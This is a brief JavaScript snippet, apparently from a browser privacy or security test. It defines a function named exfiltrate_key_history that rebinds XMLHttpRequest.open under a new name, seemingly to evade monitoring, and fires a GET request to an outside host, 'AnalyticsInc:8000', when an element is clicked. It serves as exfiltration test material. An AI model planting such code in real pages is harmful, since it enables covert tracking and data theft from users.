function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  xmlhttp.opennew = xmlhttp.open.bind(xmlhttp);
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true);
  xmlhttp.send(null);
}
document.getElementById("test").onclick = exfiltrate_key_history
